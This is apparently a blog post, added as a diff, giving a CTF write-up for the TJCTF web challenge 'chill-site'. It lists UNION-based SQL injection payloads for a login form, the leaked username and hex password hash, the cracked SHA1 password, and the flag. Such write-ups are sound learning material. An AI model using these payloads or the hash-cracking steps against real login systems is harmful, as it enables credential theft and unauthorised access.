@@ -1,0 +1,71 @@
+---
+layout: post
+title:  "TJCTF write ups"
+date:   2025-06-10 18:34:15 +0900
+categories: CTF Writeups
+---
+
+## WEB/chill-site
+
+### Challenge Summary
+
+We are provided with a login form that is vulnerable to SQL injection. Our objective is to extract credentials and obtain the flag.
+
+### Step 1: SQL Injection - Get Username
+
+**Payload used in username input:**
+
+```sql
+' UNION SELECT user, 'filtered', time FROM database /*
+```
+
+This reveals a username:
+
+```sql
+tuxtheflagmasteronlylikeslowercaseletters
+```
+
+### Step 2: SQL Injection - Get Password Hash
+
+**Payload used in username input:**
+
+```sql
+' UNION SELECT user, hex(pass), time FROM database /*
+```
+
+This reveals the password hash (in hex):
+
+```sql
+36346237633930613939313537316331303763633636336161373638353134383232383936663439
+```
+
+### Step 3: Decode the Hex
+
+Convert the hex to ASCII:
+
+```sql
+64b7c90a991571c107cc663aa768514822896f49
+```
+
+### Step 4: Crack the Hash
+
+Use [hashes.com](https://hashes.com/en/decrypt/hash) to crack the SHA1 hash:
+
+```sql
+Password: allsgud
+```
+
+### Step 5: Login
+
+Use the obtained credentials:
+
+- **Username:** `tuxtheflagmasteronlylikeslowercaseletters`
+- **Password:** `allsgud`
+
+### Step 6: Capture the Flag
+
+After logging in, click "Yes" to receive the flag:
+
+```sql
+tjctf{3verth1ng_i5_fin3}
+```
